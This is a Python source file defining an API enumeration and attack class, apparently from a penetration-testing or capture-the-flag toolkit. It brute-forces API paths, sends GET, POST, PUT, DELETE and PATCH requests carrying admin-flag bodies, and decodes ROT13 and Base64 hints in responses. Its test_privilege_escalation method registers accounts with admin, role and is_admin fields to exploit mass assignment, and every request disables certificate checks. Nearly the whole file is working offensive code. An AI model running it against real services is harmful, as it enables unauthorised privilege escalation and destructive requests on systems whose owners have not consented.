# app/tools/api_enumerator.py
import requests
import json
from urllib.parse import urljoin, urlparse
from .encoders import detect_and_decode

class APIEnumerator:
    def __init__(self, session=None, cookies=None):
        self.session = session or requests.Session()
        self.cookies = cookies or {}
        self.discovered_endpoints = set()
        self.api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/v1', '/graphql',
            '/users', '/admin', '/auth', '/login',
            '/config', '/settings', '/status'
        ]
        
    def set_auth_cookie(self, cookie_string):
        """Set authentication cookie (PHPSESSID, JWT, etc.)"""
        if '=' in cookie_string:
            key, value = cookie_string.split('=', 1)
            self.cookies[key] = value
            self.session.cookies.set(key, value)
    
    def recursive_api_discovery(self, base_url, max_depth=3):
        """Recursively discover API endpoints by following JSON links"""
        discovered = []
        queue = ['/api']
        visited = set()
        depth = 0
        
        while queue and depth < max_depth:
            current_batch = queue[:]
            queue = []
            depth += 1
            
            for path in current_batch:
                if path in visited:
                    continue
                    
                visited.add(path)
                full_url = urljoin(base_url, path)
                
                try:
                    response = self.session.get(
                        full_url, 
                        cookies=self.cookies,
                        timeout=10,
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        discovered.append({
                            'url': full_url,
                            'path': path,
                            'status': response.status_code,
                            'depth': depth
                        })
                        
                        # Parse JSON for new endpoints
                        try:
                            data = response.json()
                            new_paths = self.extract_paths_from_json(data)
                            queue.extend([p for p in new_paths if p not in visited])
                        except:
                            pass
                            
                except Exception:
                    pass
        
        return discovered
    
    def extract_paths_from_json(self, data, prefix=''):
        """Extract potential API paths from JSON response"""
        paths = []
        
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, str) and value.startswith('/'):
                    paths.append(value)
                elif key in ['url', 'endpoint', 'path', 'href'] and isinstance(value, str):
                    if value.startswith('/'):
                        paths.append(value)
                elif isinstance(value, (dict, list)):
                    paths.extend(self.extract_paths_from_json(value, f"{prefix}/{key}"))
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, (dict, list)):
                    paths.extend(self.extract_paths_from_json(item, prefix))
        
        return paths
    
    def test_http_methods(self, endpoint_url):
        """Test different HTTP methods on endpoint"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        results = {}
        
        for method in methods:
            try:
                # Prepare test data for POST/PUT
                test_data = None
                if method in ['POST', 'PUT', 'PATCH']:
                    test_data = {
                        "test": "value",
                        "admin": True,
                        "role": "admin",
                        "is_admin": 1
                    }
                
                response = self.session.request(
                    method,
                    endpoint_url,
                    json=test_data,
                    cookies=self.cookies,
                    headers={'Content-Type': 'application/json'},
                    timeout=10,
                    verify=False
                )
                
                results[method] = {
                    'status': response.status_code,
                    'response': response.text[:200] if response.text else '',
                    'headers': dict(response.headers)
                }
                
                # Check for privilege escalation hints
                if method in ['POST', 'PUT'] and response.status_code in [200, 201]:
                    try:
                        json_data = response.json()
                        if any(key in json_data for key in ['admin', 'role', 'privileges']):
                            results[method]['privilege_escalation'] = True
                    except:
                        pass
                        
            except Exception as e:
                results[method] = {'error': str(e)}
        
        return results
    
    def brute_force_endpoints(self, base_url, wordlist=None):
        """Dictionary-based endpoint brute forcing"""
        if not wordlist:
            wordlist = [
                'users', 'admin', 'auth', 'login', 'register',
                'config', 'settings', 'status', 'health', 'version',
                'profile', 'account', 'dashboard', 'panel',
                'upload', 'download', 'files', 'documents'
            ]
        
        found_endpoints = []
        
        for base_path in self.api_paths:
            for word in wordlist:
                endpoint = f"{base_path}/{word}"
                full_url = urljoin(base_url, endpoint)
                
                try:
                    response = self.session.get(
                        full_url,
                        cookies=self.cookies,
                        timeout=5,
                        verify=False
                    )
                    
                    if response.status_code in [200, 201, 401, 403]:
                        found_endpoints.append({
                            'url': full_url,
                            'path': endpoint,
                            'status': response.status_code,
                            'method': 'GET'
                        })
                        
                except Exception:
                    pass
        
        return found_endpoints
    
    def analyze_response(self, response_text):
        """Analyze API response for encoded data and hints"""
        analysis = {}
        
        try:
            data = json.loads(response_text)
            
            # Check for encoding hints
            if isinstance(data, dict):
                # ROT13 format detection
                if data.get('enctype') == 'ROT13' and 'data' in data:
                    decoded = detect_and_decode(data['data'])
                    analysis['decoded_data'] = decoded
                
                # Base64 format detection
                if data.get('format') == 'encoded' and 'data' in data:
                    decoded = detect_and_decode(data['data'])
                    analysis['decoded_data'] = decoded
                
                # Look for privilege escalation hints
                priv_keys = ['admin', 'role', 'privileges', 'permissions', 'is_admin']
                found_privs = {k: v for k, v in data.items() if k in priv_keys}
                if found_privs:
                    analysis['privilege_hints'] = found_privs
                
                # Look for error messages that reveal structure
                error_keys = ['error', 'message', 'status', 'debug']
                errors = {k: v for k, v in data.items() if k in error_keys}
                if errors:
                    analysis['error_info'] = errors
                    
        except json.JSONDecodeError:
            # Try to find encoded strings in plain text
            decoded = detect_and_decode(response_text)
            if decoded:
                analysis['decoded_data'] = decoded
        
        return analysis
    
    def test_privilege_escalation(self, base_url):
        """Test for privilege escalation vulnerabilities"""
        escalation_tests = []
        
        # Test registration with admin privileges
        register_endpoints = ['/register', '/api/register', '/api/v1/register']
        
        for endpoint in register_endpoints:
            full_url = urljoin(base_url, endpoint)
            
            # Test with admin flags
            admin_payloads = [
                {"username": "testadmin", "password": "test123", "admin": True},
                {"username": "testadmin", "password": "test123", "role": "admin"},
                {"username": "testadmin", "password": "test123", "is_admin": 1},
                {"username": "testadmin", "password": "test123", "privileges": ["admin"]}
            ]
            
            for payload in admin_payloads:
                try:
                    response = self.session.post(
                        full_url,
                        json=payload,
                        cookies=self.cookies,
                        headers={'Content-Type': 'application/json'},
                        timeout=10,
                        verify=False
                    )
                    
                    if response.status_code in [200, 201]:
                        escalation_tests.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'status': response.status_code,
                            'response': response.text[:200]
                        })
                        
                except Exception:
                    pass
        
        return escalation_tests